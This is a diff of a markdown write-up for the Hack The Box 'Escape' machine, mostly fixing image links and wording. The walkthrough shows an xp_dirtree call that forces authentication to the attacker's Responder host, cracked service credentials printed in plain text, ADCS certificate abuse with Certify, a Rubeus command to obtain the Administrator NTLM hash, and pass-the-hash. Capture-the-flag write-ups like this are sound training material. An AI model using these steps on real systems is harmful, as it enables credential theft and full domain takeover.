@@ -105,9 +105,9 @@ Looking at the results, lets start by adding sequel.htb to `/etc/hosts`
 
 Using CrackMapExec we see we have read access to a share called Public as the Guest user.
 
-Logging in we find a file called: which we can transfer back to our attacking machine using the `get` command with smbclient.
+Logging in we find a file called: SQL Server Procedures.pdf which we can transfer back to our attacking machine using the `get` command with smbclient.
 
-escape_smb.png
+![escape_smb.png](../assets/escape_assets/escape_smb.png)
 
 Looking at the file we find the following note:
 
@@ -181,11 +181,11 @@ Lets set up a Responder listener and use `XP_DIRTREE` to point back to our attac
 EXEC master..xp_dirtree '\\10.10.14.60\share\'
 ```
 
-escape_sql_hash.png
+![escape_sql_hash.png](../assets/escape_assets/escape_sql_hash.png)
 
 Nice, we were able to intercept the sql_svc user's hash. Lets try to crack this with John:
 
-escape_pw.png
+![escape_pw.png](../assets/escape_assets/escape_pw.png)
 
 Cool, we now how sql_svc credentials: sql_svc:REGGIE1234ronnie
 
@@ -221,15 +221,17 @@ Inside the log file we find Ryan.Cooper's password:
 
 We can then use this credential to login to the target via evil-winrm, and grab the user.txt flag:
 
-escape_user1.png
+![escape_user1.png](../assets/escape_assets/escape_user1.png)
 
 ### Privilege Escalation
 
-Running `whoami /all` I see ryan.cooper is in the `BUILTIN\Certificate Service DCOM Access` group. We may be able to exploit ADCS here.
+Running `whoami /all` I see ryan.cooper is in the `BUILTIN\Certificate Service DCOM Access` group. 
 
-Lets grab a copy of certify.exe from https://github.com/GhostPack/Certify and transfer it to the target. (I actually just grabbed a compiled ninary at https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
+This got me wondering if there was anyway we could exploit ADCS here.
 
-Here's the ouput of running the executable:
+Lets grab a copy of certify.exe from https://github.com/GhostPack/Certify and transfer it to the target. (Pre-compiled binary at https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
+
+Here's the ouput of running the executable as it looks for vulnerablities:
 
 ```
 *Evil-WinRM* PS C:\temp> .\Certify.exe find /vulnerable
@@ -314,7 +316,7 @@ To exploit this we can run:
 
 And we will be issued an rsa key and a certificate:
 
-escape_cert.png
+![escape_cert.png](../assets/escape_assets/escape_cert.png)
 
 Lets copy these files (all as one) back to our Kali machine and save it in a file called cert.pem.
 
@@ -347,23 +349,8 @@ Data: 4564 bytes of 4564 bytes copied
 
 Info: Upload successful!
 ```
-We can now  run:
-```
-*Evil-WinRM* PS C:\temp> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /outfile:ticket /ptt
 
-   ______        _
-  (_____ \      | |
-   _____) )_   _| |__  _____ _   _  ___
-  |  __  /| | | |  _ \| ___ | | | |/___)
-  | |  \ \| |_| | |_) ) ____| |_| |___ |
-  |_|   |_|____/|____/|_____)____/(___/
-
-  v2.1.2
-
-[*] Action: Ask TGT
-```
-
-Now that we have this ticket we can try to drop the administrator's NTLM hash
+Now that we have cert.pfx and Rubeus on the target ticket we can try to drop the administrator's NTLM hash
 
 ```
 .\Rubeus.exe asktgt /user:Administrator /certificate:C:\temp\cert.pfx /getcredentials /show /nowrap
@@ -371,7 +358,7 @@ Now that we have this ticket we can try to drop the administrator's NTLM hash
 
 It worked! We now have the admin hash:
 
-escape_admin_hash.png
+![escape_admin_hash.png](../assets/escape_assets/escape_admin_hash.png)
 
 We can now pass-the-hash with impacket-psexec:
 
@@ -396,7 +383,7 @@ nt authority\system
 
 And grab the final flag:
 
-escape_root.png
+![escape_root.png](../assets/escape_assets/escape_root.png)
 
 Thanks for following along!
 
